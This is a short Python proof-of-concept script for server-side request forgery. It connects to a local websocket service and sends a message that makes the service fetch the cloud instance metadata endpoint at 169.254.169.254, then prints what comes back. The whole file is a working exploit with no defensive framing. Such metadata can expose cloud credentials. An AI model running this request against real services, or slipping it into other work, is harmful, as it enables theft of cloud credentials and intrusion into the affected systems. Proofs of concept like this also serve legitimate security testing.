#!/usr/bin/env python3
"""PoC: SSRF"""
import json
from websocket import create_connection
ws = create_connection("ws://localhost:5001/socket.io/?EIO=4&transport=websocket", timeout=10)
ws.send(json.dumps({'url': 'http://169.254.169.254/latest/meta-data/'}))
try:
    print(ws.recv()[:500])
except Exception as e:
    print("err:", e)
ws.close()
